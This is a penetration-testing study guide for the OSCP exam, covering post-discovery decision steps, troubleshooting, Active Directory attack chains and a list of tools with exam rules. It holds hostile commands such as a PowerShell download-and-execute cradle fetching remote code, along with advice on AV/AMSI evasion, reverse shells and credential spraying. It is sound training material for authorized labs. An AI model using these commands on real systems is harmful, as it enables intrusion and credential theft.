# OSCP+ KNOWLEDGE BASE — VOLUME 6
## "I FOUND X, WHAT NOW?" · STUCK PROTOCOL · TROUBLESHOOTING · ATTACK CHAINS · TECH ENCYCLOPEDIA · TOOLBOX · MACHINE JOURNAL · FINAL DELIVERABLES

---

# [FOUND-*]  "I FOUND X, WHAT NOW?"  (do-this-first → then → if-fails → change hypothesis)

### [FOUND-CREDS] I found credentials
1. **Spray everywhere:** `nxc smb/winrm/ldap/mssql/rdp <hosts> -u U -p P` + `ssh`/`evil-winrm` + web logins. Try `--local-auth` and domain form.
2. Try the same user with password **variations**; try the password with **other users**.
3. If domain → **BloodHound as this user** + Kerberoast/AS-REP.
4. IF FAILS: maybe it's a hash not a password; maybe it unlocks a *file* (KeePass/zip) → crack. → change hypothesis: creds may be for a specific app, not the OS.

### [FOUND-SSHKEY] I found a private SSH key
1. `chmod 600 key; ssh -i key user@host` (guess user from filename/context/`authorized_keys`).
2. Encrypted? `ssh2john key > h; john --wordlist=rockyou.txt h`.
3. Try the key against **other** hosts/users (reuse).
4. IF FAILS: wrong user — check `/etc/passwd`, home dirs, `authorized_keys` comment field for the username.

### [FOUND-SUID] I found an unusual SUID binary
1. GTFOBins the name (SUID section).
2. Custom binary → `strings`/`ltrace ./bin` → relative-path call (PATH hijack) or command exec.
3. `pkexec` present → PwnKit.
4. IF FAILS: it drops privs internally / no exploitable call → move to sudo/cron/caps.

### [FOUND-SUDO] `sudo -l` shows something
1. GTFOBins the allowed binary (Sudo section).
2. Editable script as root → inject payload. `env_keep LD_PRELOAD` → `.so` hijack.
3. Version-specific: CVE-2021-3156 / CVE-2019-14287.
4. IF FAILS: binary with no escape + no writable input → different vector.

### [FOUND-SMB] I found SMB
1. `nxc smb $IP -u '' -p '' --shares --users`; `smbclient -N -L //$IP/`; `enum4linux-ng -A $IP`.
2. Read every readable share (GPP/`unattend.xml`/scripts/backups/`.kdbx`).
3. Have creds → spray + `--rid-brute`; Pwn3d! → psexec/wmiexec.
4. Domain name shown → pivot to **AD** (`[AD-QUICK]`). IF FAILS: null disabled → need creds first.

### [FOUND-WRITABLE-SERVICE] I found a writable service / unquoted path (Windows)
1. Confirm write to binary/segment (`accesschk`/PowerUp).
2. Replace/plant payload → `sc stop/start` (or wait for reboot/auto-restart).
3. IF FAILS: can't restart → find another service, or reboot-persistence, or different vector.

### [FOUND-PW-CONFIG] I found a password in a config file
1. Identify what it's for (DB? app? SSH? domain?). Try it on that service AND everywhere (reuse).
2. DB cred → log into DB → dump app users/hashes → next creds.
3. IF FAILS: could be old/rotated → try variations; look for more configs/backups.

### [FOUND-GIT] I found a .git repo
1. `git-dumper http://$IP/.git ./loot` (or already local: `cd repo`).
2. `git log -p | grep -iE 'pass|secret|key|token'`; `git show <deleted>`; `git stash list`.
3. Read source → find vulns/endpoints/creds.
4. IF FAILS: check branches/tags, `.git/config` for remotes/creds.

### [FOUND-BACKUP] I found a backup (.bak/.zip/.old)
1. Download + extract; encrypted zip → `zip2john`.
2. Read for creds/source/DB dumps; source of a running app → find its vuln.
3. IF FAILS: check for more backups; different extension guesses in dir brute.

### [FOUND-SQLI] I found SQL injection
→ `[SQLI-DECISION-TREE]`: identify DB → union/blind → dump creds → (MSSQL `xp_cmdshell`/Postgres `COPY`/MySQL `FILE`) RCE. IF FAILS: dump creds and pivot to a login instead of chasing RCE.

### [FOUND-LFI] I found LFI
→ `[WEB-LFI]`: `/etc/passwd` confirm → `php://filter` read source (creds) → log poisoning / wrapper RCE. IF FAILS: use it purely to read config/keys → SSH/login.

### [FOUND-CMDINJ] I found command injection
→ `[WEB-CMDINJ]`: confirm with `;id`/`sleep`, then reverse shell (URL-encoded). IF FAILS: blind → exfil via HTTP/DNS; filtered → `${IFS}`/base64.

### [FOUND-DOMAINUSER] I found a valid domain user
→ `[AD-QUICK]`/`[THINK-DOMAINUSER]`: BloodHound + Kerberoast + AS-REP + spray → follow shortest path.

### [FOUND-SPN] I found an SPN (Kerberoastable)
→ `[AD-KERBEROAST]`: `GetUserSPNs -request` → hashcat 13100 → reuse pw + check that account's rights.

### [FOUND-ASREP] I found an AS-REP-roastable user
→ `[AD-ASREP]`: `GetNPUsers` → hashcat 18200 → reuse.

### [FOUND-HASH] I found a hash
→ `[HASH-IDENTIFICATION]`: identify type. If NTLM → **PtH first** (`nxc -H`), then crack. Else pick the right hashcat mode.

### [FOUND-LINSHELL] I got a Linux shell
1. Stabilize TTY. 2. `id; sudo -l; find / -perm -4000 2>/dev/null`. 3. linpeas. 4. Loot creds + note internal subnets (pivot). → `[LINUX-PRIVESC-QUICK]`.

### [FOUND-WINSHELL] I got a Windows shell
1. `whoami /all`. 2. `whoami /priv` (SeImpersonate → Potato). 3. winpeas + service/registry checks. 4. Loot creds → lateral. → `[WINDOWS-PRIVESC-QUICK]`.

### [FOUND-WINRM] I found WinRM (5985)
Have creds? `nxc winrm` → Pwn3d! → `evil-winrm -i $IP -u U -p P` (or `-H hash`). No creds → get them first (roast/spray/loot).

### [FOUND-RDP] I found RDP (3389)
Validate `nxc rdp`; connect `xfreerdp /v:$IP /u:U /p:P +clipboard`. Use for GUI privesc/transfer. PtH needs Restricted Admin.

### [FOUND-BH-GENERICALL] BloodHound shows I have GenericAll
→ `[AD-ACL]`: on user → force-change pw / shadow creds; on group → add self; on computer → RBCD/shadow; on domain → DCSync.

### [FOUND-ACL] I found an ACL edge
→ `[AD-ACL]` table: map edge → recipe (WriteDACL→grant GenericAll; WriteOwner→own→DACL; AddKeyCredentialLink→shadow creds; etc.).

### [FOUND-PIVOT] I found a pivot host (dual-homed)
→ `[PIVOT-QUICK]`: Ligolo/Chisel → route/proxychains → enumerate new subnet → spray creds there.

---

# [STUCK-PROTOCOL]  (been stuck 15–30 min)

**Run this exact sequence — it prevents re-trying the same failed attack.**
```
1. STOP & RE-READ your notes/scans. Answer: what have I NOT tried yet? (list untried surfaces)
2. RE-ENUMERATE: full -p- TCP again + top UDP. New port? Re-run -sCV. (Services can start; you may have missed one.)
3. RE-MAP WEB: every port, recursive dir brute + vhosts + params you skipped. Read source/JS again.
4. CHECK ASSUMPTIONS: is the version/OS/DB what I think? Verify manually, not via one tool's guess.
5. CREDENTIALS: have I sprayed EVERY cred on EVERY service/user/host? Variations? Reuse?
6. DIFFERENT PROTOCOL/SERVICE: attack a service I dismissed (SNMP/UDP/RPC/LDAP/NFS/redis).
7. VERSION RESEARCH: searchsploit + web for exact versions I found; read the CVE technique, try manually.
8. LOCAL (if I have a shell): re-run linpeas/winpeas, `sudo -l`, `whoami /priv`, loot again; new user = new surface.
9. AD: re-check roasts, BloodHound "from owned", un-sprayed hosts, ACL edges I skipped.
10. PIVOT: did I verify the tunnel actually works? re-scan the internal subnet.
11. REVERT the box (service may be crashed / prior-tester state).
12. SWITCH TARGET: write exactly where I stopped, go work another machine, return with fresh eyes.
```
**Meta-checks:** Am I retrying variants of one hypothesis (rabbit hole)? Am I editing an exploit I don't understand? Did I skip enumeration to jump to exploitation? The answer is almost always **something un-enumerated**, not a harder exploit.

# [COMMON-RABBIT-HOLES]  hub (per-area traps — jump to yours)
Each area has its own trap list; open the one for what you're doing:
- Enumeration/nmap → search **`[COMMON-RABBIT-HOLES nmap]`** (Vol ④): `--script vuln` false positives, chasing "filtered" ports, full UDP `-p-`.
- Web → **`[COMMON-RABBIT-HOLES web]`** (Vol ⑤): endless dir-brute, XSS with no victim, deserialization/XXE without source.
- SQLi → uncrackable/over-fuzzed single param (see `[SQLI-TROUBLESHOOTING]`).
- Linux privesc → **`[COMMON-RABBIT-HOLES linux-privesc]`** (Vol ⑦): kernel exploits first, chasing every SUID, cracking a hash you don't need.
- Windows privesc → **`[COMMON-RABBIT-HOLES windows-privesc]`** (Vol ⑦): jumping to kernel before `whoami /priv`, unquoted path with no writable segment.
- AD → **`[COMMON-RABBIT-HOLES ad]`** (Vol ⑧): grinding an uncrackable roast, ignoring BloodHound, forgetting to spray a new cred, exotic delegation when a simple ACL edge exists.
- Pivoting → **`[COMMON-RABBIT-HOLES pivot]`** (Vol ⑧): UDP/SYN over SOCKS, huge port ranges through a proxy, wrong tunnel direction.
> **Universal tell:** if it needs a 0-day or a miracle, you're in a hole — the intended path is simpler and you missed enumeration (`[STUCK-PROTOCOL]`).

---

# [TROUBLESHOOTING-QUICK] + [TROUBLESHOOTING-DB]  (SYMPTOM → CAUSES → CHECKS → FIX → IF STILL BROKEN)

### Reverse shell doesn't connect  → full version `[REVERSE-SHELL-NOT-CONNECTING]`
CAUSES: wrong LHOST (used eth0 not tun0), listener down, egress blocked, encoding/quoting, AV.
CHECKS: `ip a show tun0`; listener live; try ports 443/80/8080; `tcpdump -i tun0 port 443`.
FIX: correct LHOST, common port, base64/URL-encode, try sh/python/nc, use bind shell or webshell. IF STILL: pivot to expose your listener.

### HTTP works in browser but curl fails
CAUSES: needs `Host:` header (vhost), cookie/session, User-Agent filter, TLS/redirect.
CHECKS: `curl -v`; compare headers; add `-H "Host: name"`, `-b cookie`, `-A ua`, `-L`, `-k`.
FIX: replicate the browser request (copy as curl from Burp/DevTools).

### Exploit crashes / errors
CAUSES: Python2 vs 3, wrong version/arch/target index, missing deps, hardcoded IP.
CHECKS: read the code; `python2 exploit.py`; check offsets/targets; deps.
FIX: adjust LHOST/LPORT/target/paths; convert py2→py3; install deps. IF STILL: find alternate PoC or do the technique manually.

### Exploit works locally but not remotely
CAUSES: firewall/egress, different arch/patch level, path assumptions, timing/race.
FIX: check egress, match target build, adjust paths, add sleeps/retries.

### Python version mismatch
`print x` → py2. Run with `python2`, or fix syntax (`print()`, `.encode()`, `urllib`).

### SMB authentication failure
CAUSES: wrong domain/format, null disabled, SMBv1 only, signing.
CHECKS: `-d DOMAIN` / `DOMAIN/user`; `--local-auth`; `client min protocol=NT1`.
FIX: correct account type; PtH `-H`; different exec method.

### Kerberos errors
`KRB_AP_ERR_SKEW` → `sudo ntpdate $DC`. `KDC_ERR_PREAUTH` → wrong pw / need pre-auth. `KDC_ERR_S_PRINCIPAL_UNKNOWN` → wrong SPN/host (use hostname not IP, add to `/etc/hosts`). Use FQDN + `-k`.

### BloodHound problems
Collection fails → clock skew, wrong `-ns`/`-d`, LDAP signing → try `-c DCOnly`. Import fails → collector/GUI version mismatch.

### WinRM authentication problems
`nxc winrm` ok but `evil-winrm` fails → user not in Remote Management Users; TLS on 5986 (`-S`); clock skew (Kerberos) → use `-u/-p` NTLM.

### SSH problems
"Permission denied (publickey)" → wrong user/key. Old cipher → `-oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa`. Key perms → `chmod 600`.

### TTY problems
Ctrl-C kills shell / no arrows → do the full `[SHELL-STABILIZE]` (python pty + `stty raw -echo; fg` + `export TERM=xterm` + `stty rows/cols`).

### File transfer failure
→ `[FILETRANSFER-TROUBLESHOOTING]`: certutil blocked → curl.exe/bitsadmin/SMB; binary corrupt → `binary` mode; no egress → serve from target / base64.

### PowerShell problems
AMSI/ExecutionPolicy blocks script → `powershell -ep bypass`; base64 `-enc`; download-and-exec in memory `IEX(New-Object Net.WebClient).DownloadString('http://IP/x')`; AV kills it → obfuscate / use `.NET`/nc.exe.

### Hash cracking failure
CAUSES: wrong mode, malformed hash, pw not in wordlist.
CHECKS: `hashid`; verify hash format (no username unless mode expects it); try rules (`best64`, `OneRule`) + bigger lists.
FIX: right `-m`; `--username` to strip; targeted wordlist (company words). IF STILL: pw too strong → different vector.

### Chisel problems
Client won't connect → egress/port (use 443), server `--reverse`, arch mismatch. No traffic → proxychains `socks5 127.0.0.1 1080`, use `-sT -Pn`.

### Ligolo problems
No traffic → `ip route add <subnet> dev ligolo` missing; session not started; agent cert (`-ignore-cert`). Reverse shell from internal won't arrive → add ligolo listener to expose Kali.

### Proxychains problems
Refused → SOCKS down/wrong port. Hang → SYN/UDP over SOCKS (use `-sT -Pn -n`). DNS → use IPs / `proxy_dns`.

### DNS problems
Name won't resolve → add to `/etc/hosts` (`$IP name.domain`). Zone transfer refused → try each NS, or brute subdomains.

### Vhost problems
Same page for every Host → filter baseline with ffuf `-fs <size>` / `-fw <words>`; add real vhost to `/etc/hosts`; some apps need exact case/scheme.

### Nmap filtered ports
Firewall/ICMP → `-Pn`, lower `--min-rate`, `-sT` through proxy; a single "filtered" port is usually not worth an hour.

### Privilege escalation exploit fails
CAUSES: wrong kernel/build, compiled on wrong libc/arch, needs specific conditions.
CHECKS: exact `uname`/`systeminfo` match; compile on target-matching env; read prerequisites.
FIX: pick the right exploit/build; try the intended non-kernel vector first (kernel is last resort). IF STILL: re-enumerate — you likely missed an easier vector.

---

# [CHAIN-*] ATTACK CHAINS (with the reasoning between stages)

### [CHAIN-WEB-SSH] Web → creds → SSH → Linux privesc
Web app leaks creds (config/LFI-read-source/DB dump) → **reason:** users reuse passwords → SSH in as that user → `sudo -l`/SUID → root. *Connective logic:* the web box and the OS user share a secret.

### [CHAIN-SMB-WINRM] SMB → creds → WinRM → Windows privesc
Null/guest SMB share holds `unattend.xml`/GPP cpassword → decrypt → **reason:** valid domain/local cred → `nxc winrm` Pwn3d! → evil-winrm → `whoami /priv` SeImpersonate → Potato → SYSTEM.

### [CHAIN-LFI-CONFIG-SSH] Web → LFI → config → creds → SSH
`?page=` LFI → `php://filter` reads `config.php` → DB/user creds → **reason:** reuse → SSH → privesc. *Logic:* LFI's value is often file-read, not RCE.

### [CHAIN-SQLI-FOOTHOLD] SQLi → DB creds → service auth → foothold
SQLi dumps `users` table → crack/reuse a hash → **reason:** admin panel or SSH/SMB uses same cred → login → foothold. Or MSSQL SQLi → `xp_cmdshell` → shell directly.

### [CHAIN-AD-KERBEROAST] Domain user → Kerberoast → crack → lateral → ACL → DA
Assumed-breach user → `GetUserSPNs` → crack service acct → **reason:** service acct is local admin on a host → secretsdump → BloodHound "from owned" shows `WriteDACL` to a DA-group member → grant GenericAll → shadow creds → that user has DCSync → `secretsdump` domain → PtH Administrator → own DC + members.

### [CHAIN-ASREP-SPRAY] User list → AS-REP → crack → spray → foothold
No creds, just usernames → AS-REP roast a pre-auth-disabled user → crack → **reason:** spray reveals it's admin somewhere → evil-winrm → privesc.

### [CHAIN-PIVOT-INTERNAL] Foothold → pivot → internal AD
Root a DMZ host → discover `172.16.x` → **reason:** internal subnet has the DC → Ligolo route → BloodHound over the tunnel → standard AD chain to DA.

### [CHAIN-SNMP-CREDS] SNMP → process args → creds → login
`snmpwalk` shows a process run with `-p Password123` in args → **reason:** that's a live service cred → login to the service/OS. *Logic:* UDP enum you almost skipped held the key.

---

# [TECH-*] TECHNOLOGY ENCYCLOPEDIA
*(WHAT / HOW / WHY OSCP CARES / ENUMERATE / MISCONFIGS / ATTACKS / KEY CMDS / INTERESTING / TROUBLESHOOT / LEADS TO / RELATED)*

### [TECH-HTTP]/[TECH-HTTPS]
WHAT: request/response web protocol; HTTPS = HTTP over TLS. WHY: #1 foothold surface. ENUM: `[WEB-*]`. MISCONFIG: dir listing, backups, verbose errors, default creds, exposed `.git`/`.env`. ATTACKS: all web vulns. INTERESTING: Server/X-Powered-By headers, cert SAN (vhosts), redirects. LEADS TO: RCE/creds. RELATED: PHP, Apache, Nginx, IIS.

### [TECH-DNS]
WHAT: name↔IP + service records. WHY: zone transfer dumps internal names; AD SRV records reveal DCs. ENUM: `dig axfr`, `dnsrecon`, SRV lookups. MISCONFIG: AXFR to anyone. LEADS TO: vhosts, DC discovery. RELATED: AD, vhosts.

### [TECH-SMB]
WHAT: Windows file/print sharing + IPC over 445. WHY: enum, cred validation, lateral movement, loot. ENUM: `[SMB-ENUM]`. MISCONFIG: null/guest, writable shares, signing off, GPP cpassword. ATTACKS: RID brute, PtH, psexec/wmiexec, relay, EternalBlue (old). LEADS TO: creds, shells, AD. RELATED: RPC, LDAP, Kerberos, NTLM.

### [TECH-LDAP]
WHAT: directory access protocol = AD database over the wire. WHY: dump users/computers/ACLs; creds in `description`. ENUM: `ldapsearch`, `ldapdomaindump`, `nxc ldap`. MISCONFIG: anonymous bind, secrets in attributes. LEADS TO: full AD map, roast lists. RELATED: Kerberos, AD, BloodHound.

### [TECH-KERBEROS]
WHAT: ticket-based AD auth (AS-REQ/TGT/TGS). WHY: Kerberoast/AS-REP without admin; PtT/Golden. ENUM: `[ENUM-KERBEROS]`. MISCONFIG: pre-auth disabled, weak service-account passwords, delegation. ATTACKS: Kerberoast, AS-REP, PtT, S4U, Golden/Silver. INTERESTING: SPNs, `DONT_REQ_PREAUTH`, delegation flags. TROUBLESHOOT: clock skew, FQDN/SPN naming. RELATED: LDAP, NTLM, AD.

### [TECH-NTLM]
WHAT: challenge/response auth + the NT hash. WHY: PtH, relay, cracking NetNTLMv2. ENUM: capture via Responder; `secretsdump`. MISCONFIG: signing off (relay), NTLMv1. ATTACKS: PtH, relay, offline crack (`-m 5600`). RELATED: SMB, Kerberos.

### [TECH-SSH]
WHAT: encrypted remote shell/tunnel. WHY: payoff foothold + pivoting. ENUM: banner, key auth. MISCONFIG: password auth + weak pw, reused/world-readable keys. ATTACKS: key reuse, tunneling (`-L/-R/-D`). RELATED: pivoting, Linux.

### [TECH-FTP]/[TECH-RDP]/[TECH-WINRM]/[TECH-NFS]/[TECH-SNMP]
See `[ENUM-FTP]`, `[ENUM-RDP]`, `[ENUM-WINRM]`, `[ENUM-NFS]`, `[ENUM-SNMP]` — each covers what/why/enum/attacks/leads-to.

### [TECH-SQL]
WHAT: relational DBs (MySQL/MSSQL/Postgres/SQLite). WHY: SQLi → data/creds/RCE; direct login → RCE. ENUM/ATTACK: `[SQLI-*]`, `[ENUM-MSSQL]` `[ENUM-MYSQL]` `[ENUM-POSTGRES]`. MSSQL `xp_cmdshell`, Postgres `COPY PROGRAM`, MySQL `FILE`. LEADS TO: creds, RCE.

### [TECH-JWT]
WHAT: signed token (header.payload.signature). WHY: forge identity. ATTACKS: `alg:none`, weak-secret crack (`-m 16500`), RS/HS confusion, `kid`/`jku`. RELATED: web auth.

### [TECH-PHP]/[TECH-APACHE]/[TECH-NGINX]/[TECH-IIS]
PHP: wrappers (`php://filter`, `data://`), LFI→RCE, weak type juggling (`==`), `phpinfo` leaks. Apache: `.htaccess`, mod_cgi (Shellshock), 2.4.49/.50 traversal. Nginx: alias traversal, misrouted `/`, off-by-slash. IIS: `.aspx`/`web.config` upload, app-pool identity (SeImpersonate), short-name (8.3) enum, WebDAV. LEADS TO: RCE/creds.

### [TECH-AD]
WHAT: Windows domain directory (users/computers/policies/trusts). WHY: **the 40-point exam set.** ENUM/ATTACK: all `[AD-*]`. Mental model: creds → what they unlock (BloodHound) → move up → DCSync. RELATED: LDAP/Kerberos/NTLM/SMB.

### [TECH-POWERSHELL]
WHAT: Windows shell/scripting. WHY: enum + exec + download. KEY: `-ep bypass`, `-enc`, `IEX(New-Object Net.WebClient).DownloadString(...)`, `Get-History`/PSReadline. WATCH: AMSI/logging. RELATED: Windows privesc, evil-winrm.

### [TECH-LINUXPERMS]
WHAT: uid/gid, rwx, SUID/SGID/sticky, capabilities, sudoers. WHY: privesc lives here. KEY: `find -perm -4000`, `getcap`, `sudo -l`, `/etc/passwd|shadow|sudoers`. RELATED: `[LINUX-PRIVESC]`.

### [TECH-TOKENS]
WHAT: Windows access tokens + privileges (SeImpersonate, SeBackup, SeDebug, etc.). WHY: privilege abuse → SYSTEM. KEY: `whoami /priv`, Potato attacks. RELATED: `[WINDOWS-TOKENS]`.

---

# [TOOL-*] TOOLBOX  (PURPOSE / QUICK / KEY FLAGS / OUTPUT / MISTAKES / WHEN / WHEN NOT)

- **nmap** — port/service scan. `-p- --min-rate 2000`, `-sCV`, `-sU --top-ports`. Mistake: top-1000 only; trusting `-sV` guess. When not: through SOCKS (use `-sT`).
- **rustscan** — fast port discovery → pipe to nmap. `-a IP -- -sCV`. When not: if nmap two-step is fine.
- **ffuf / feroxbuster / gobuster** — content/vhost/param fuzzing. ffuf `-u .../FUZZ -w list -fs N`; ferox recursive by default. Mistake: no `-fs` baseline for vhosts; giant wordlists. 
- **nikto** — quick web misconfig sweep. Noisy; leads not proof.
- **whatweb / wafw00f** — stack + WAF fingerprint.
- **burp (community)** — intercept/repeat/decode; save requests for sqlmap `-r`. No active scanner in community.
- **curl / wget** — request/transfer. `curl -v/-k/-L/-H/-b/-A`; `wget -r ftp://`.
- **nc / socat** — listeners/shells/transfer. `nc -lvnp 443`; socat full TTY.
- **impacket** — `psexec/wmiexec/smbexec/secretsdump/GetUserSPNs/GetNPUsers/mssqlclient/getTGT/getST/ntlmrelayx/lookupsid`. The AD swiss-army knife.
- **netexec (nxc) / crackmapexec** — spray + enum + PtH across smb/winrm/ldap/mssql/rdp/ssh. `-u -p -H --shares --users --rid-brute --continue-on-success --local-auth`. Mistake: spraying past lockout.
- **enum4linux-ng** — one-shot SMB/RPC/LDAP enum. `-A $IP`.
- **smbclient / rpcclient / ldapsearch** — manual SMB/RPC/LDAP.
- **bloodhound / bloodhound-python / SharpHound** — AD graph. `-c all`. Mistake: not marking Owned; version mismatch.
- **evil-winrm** — Windows shell over WinRM. `-i -u -p` / `-H`; `upload/download`; `-s scripts`.
- **linpeas / winpeas / pspy / seatbelt / powerup** — local enum. Read RED; verify manually; pspy catches crons.
- **searchsploit** — offline Exploit-DB. `-m` copy, `-x` view, `-u` update. Read before running.
- **msfconsole / msfvenom** — **exam: one target only.** msfvenom for payloads (`-p ... -f exe/msi/aspx LHOST LPORT`). 
- **hashcat / john** — crack. hashcat `-m` mode + rules; john auto-detect. `ssh2john/zip2john/keepass2john`.
- **chisel / ligolo-ng / proxychains / ssh** — pivoting (`[PIVOT-*]`).
- **certipy / bloodyAD / pywhisker / kerbrute** — modern AD abuse (ADCS, ACL edits, shadow creds, user enum).

---

# [KALI-TOOLBOX]  🧰 every exam-usable Kali tool, by phase (+ allowed/banned)

> Kali ships **thousands** of tools; you need **~40**. This is the exam-usable set grouped by *when you use it*, each with a one-line purpose. **Legend:** ✅ allowed freely · 1️⃣ Metasploit **one-target-only** · ⚠️ allowed **with a caveat** · ⛔ **BANNED** (see `[EXAM-RULES-2026]`). Verify against the current official guide.
> See installed tools: `apt list --installed 2>/dev/null | grep <name>`, browse `/usr/share/`, or the Kali menu categories.
> 👉 To **install/download** these (apt + `~/tools` folder for winpeas/potatoes/chisel/ligolo), see **`[KALI-SETUP]`**. This section = *understand & use*; that one = *install*.

## 1) Port scanning & host discovery
```
✅ nmap        the one you live in — ports/services/versions/NSE scripts  [NMAP-QUICK]
✅ rustscan    ultra-fast port find → pipes into nmap
✅ masscan     very fast sweep (always re-verify hits with nmap -sCV)
✅ arp-scan / netdiscover / fping   host discovery on an internal subnet (post-pivot)
⛔ Nessus / OpenVAS / Nexpose       automated vuln scanners — BANNED
```

## 2) Web — recon & content discovery
```
✅ whatweb / wafw00f     tech stack + WAF fingerprint
✅ feroxbuster / ffuf / gobuster / dirb / dirsearch   directory & file brute
✅ ffuf / gobuster vhost + arjun / wfuzz              vhost & hidden-parameter discovery
✅ wpscan / joomscan / droopescan                     CMS-specific scanners
✅ nikto                 quick misconfig/known-file sweep (leads, not proof)
✅ curl / wget           manual requests, transfer, header/cookie testing
```

## 3) Web — proxy & manual exploitation
```
✅ Burp Suite COMMUNITY   intercept/repeat/decoder/comparer (no active scanner)   ⛔ Burp PRO banned
✅ OWASP ZAP              alt proxy
✅ manual SQLi/LFI/RCE    do it by hand — [WEB-*] [SQLI-*]
⛔ sqlmap / sqlninja / db_autopwn / browser_autopwn   auto-exploitation — BANNED, do SQLi MANUALLY
```

## 4) SMB / RPC / LDAP / service enumeration
```
✅ netexec (nxc) / crackmapexec   spray + enum + PtH across smb/winrm/ldap/mssql/rdp/ssh
✅ smbclient / smbmap             list & access shares
✅ enum4linux-ng / enum4linux     one-shot SMB/RPC/LDAP enum
✅ rpcclient / nbtscan / nmblookup   RPC user enum & NetBIOS
✅ ldapsearch / windapsearch / ldapdomaindump   LDAP/AD directory dump
✅ snmpwalk / snmp-check / onesixtyone   SNMP loot
✅ dig / dnsrecon / dnsenum        DNS + zone transfers
✅ showmount / mount               NFS
```

## 5) Active Directory attack
```
✅ impacket-*   psexec/wmiexec/smbexec/atexec/dcomexec/secretsdump/GetUserSPNs/GetNPUsers/
                getTGT/getST/ntlmrelayx/lookupsid/mssqlclient  — the AD swiss-army knife
✅ bloodhound / bloodhound-python / SharpHound   the graph (find the path)
✅ kerbrute            user enum + password spray over Kerberos
✅ certipy             ADCS (ESC1–8) abuse
✅ bloodyAD / pywhisker / owneredit / dacledit   ACL edits, shadow creds
✅ Rubeus / PowerView / mimikatz / pypykatz      Windows-side Kerberos/creds
✅ evil-winrm          WinRM shell (`-u -p` / `-H` PtH)
⚠️ Responder / Inveigh   ANALYZE mode only (`-A`) — LLMNR/NBNS/WPAD POISONING (`-w`) is ⛔ BANNED
⛔ mitm6/bettercap ARP·DNS spoofing   BANNED (spoofing)
```

## 6) Password attacks & cracking
```
✅ hashcat / john      offline cracking (`-m` mode / rules; john auto-detects)
✅ *2john              ssh2john / zip2john / keepass2john / office2john → crackable hashes
✅ hydra / medusa      online brute (evidence + lockout-aware only; last resort)
✅ netexec / kerbrute  password spraying (check --pass-pol first)
✅ cewl / crunch       build custom wordlists
✅ hashid / name-that-hash   identify a hash type
✅ gpp-decrypt / LaZagne / mimikatz   recover stored creds
```

## 7) Exploit research & payloads
```
✅ searchsploit        offline Exploit-DB (`-m` copy, `-x` view, `-u` update) — READ before running
✅ msfvenom            payload generator (exe/elf/msi/aspx/war/dll/raw) — usable on ALL boxes
✅ gcc / mingw-w64     compile/cross-compile exploits  [FIXING-EXPLOITS]
✅ public PoCs (GitHub/EDB)   allowed if you understand + run them manually
```

## 8) Metasploit (special rules)
```
1️⃣ msfconsole modules (exploit/post) + Meterpreter   ONE target only; locks you to it; NOT for pivoting
✅ msfvenom + exploit/multi/handler                   exempt — usable everywhere
```

## 9) Shells, listeners & file transfer
```
✅ nc (netcat) / socat / ncat        listeners + shells (`nc -lvnp 443`; socat full TTY)
✅ python3 -m http.server            serve files to targets
✅ impacket-smbserver                SMB drop for Windows
✅ certutil / bitsadmin / curl.exe   (on target) Windows downloads
✅ powercat / Invoke-ConPtyShell     PS netcat + real Windows TTY
✅ revshells.com (offline copy)      reverse-shell generator  [SHELL-REVSHELLS]
```

## 10) Pivoting & tunneling
```
✅ ligolo-ng          cleanest pivot (routed interface, native tools)  [PIVOT-LIGOLO]
✅ chisel             SOCKS/port-forward over HTTP  [PIVOT-CHISEL]
✅ sshuttle / ssh -L/-R/-D   SSH-based pivots  [PIVOT-SSH]
✅ proxychains(4)     run tools through a SOCKS proxy
✅ plink / netsh portproxy   Windows-side forwarding
```

## 11) Privilege-escalation enumeration
```
✅ linpeas / winpeas         automated local enum (read RED; verify manually)
✅ pspy                      catch cron/root processes (no root needed)
✅ PowerUp / Seatbelt / PrivescCheck / JAWS   Windows privesc checks
✅ accesschk / icacls        Windows permission checks
✅ PrintSpoofer / GodPotato / JuicyPotatoNG / RoguePotato / SharpEfsPotato   SeImpersonate → SYSTEM
✅ wesng / windows-exploit-suggester / linux-exploit-suggester   kernel-exploit leads
✅ GTFOBins / LOLBAS (bookmarks)   binary-abuse references
```

## 12) Wordlists & references (ship with Kali)
```
✅ /usr/share/wordlists/rockyou.txt   (gunzip once) · /usr/share/seclists/ · /usr/share/webshells/
✅ dirb/dirbuster lists · nmap NSE scripts (/usr/share/nmap/scripts)
```

## 13) Notes & screenshots (for the report)
```
✅ CherryTree / Obsidian / Sublime / vim   note-taking
✅ Flameshot / gnome-screenshot / Greenshot   screenshots (flag + whoami/id + ip in ONE shot)
✅ script / tmux   command logging + persistent sessions
```

## ⛔ BANNED / avoid (using these can void points — `[EXAM-RULES-2026]`)
```
⛔ sqlmap, sqlninja, db_autopwn, browser_autopwn   (automatic exploitation)
⛔ Nessus, OpenVAS, Nexpose                         (mass/auto vuln scanners)
⛔ Responder/Inveigh POISONING, bettercap, ARP/DNS spoofing   (spoofing)
⛔ Burp Pro, Metasploit Pro, other commercial tools
⛔ AI / LLM chatbots during the exam AND report   (this KB as STATIC notes = allowed)
1️⃣ Metasploit modules/Meterpreter beyond your ONE chosen target
```

**Reality check:** you'll pass using maybe 15 of these constantly — nmap, feroxbuster/ffuf, netexec, smbclient, impacket, evil-winrm, BloodHound, linpeas/winpeas, the potatoes, hashcat, ligolo/chisel, nc/socat, searchsploit, msfvenom. Learn those cold; the rest are situational.

---

# [FLAG-HUNT]  🚩 find the flag on any box (paste-and-go)
> Flags are usually named `proof.txt` / `local.txt` (also `flag.txt`/`root.txt`/`user.txt`) and live on a **user's Desktop** (Windows) or **`/root`** / **`/home/<user>`** (Linux). If they're not there, search by **name** then by **content**.

## 🪟 Windows — PowerShell (in evil-winrm / PS shell)
```
whoami                                                         # who am I? (flag is often on THIS user's Desktop)
dir C:\Users\ ; dir C:\Users\*\Desktop\                        # list users + their desktops
type C:\Users\*\Desktop\*.txt                                  # dump every desktop .txt
# search by FILENAME anywhere:
Get-ChildItem C:\ -Recurse -Force -Include proof.txt,local.txt,flag.txt,root.txt,user.txt -EA SilentlyContinue | Select FullName
# search by CONTENT (flag marker):
Get-ChildItem C:\Users\ -Recurse -Include *.txt -EA SilentlyContinue | Select-String -Pattern 'OS\{|flag' -List
```
## 🪟 Windows — cmd
```
dir /s /b C:\proof.txt C:\*flag*.txt 2>nul                     # find by name
where /r C:\ proof.txt                                          # locate proof.txt
type C:\Users\Administrator\Desktop\proof.txt                   # common spot
findstr /s /i "OS{ flag" C:\Users\*.txt 2>nul                   # find by content
```
## 🐧 Linux (on a target shell)
```
id                                                             # who am I?
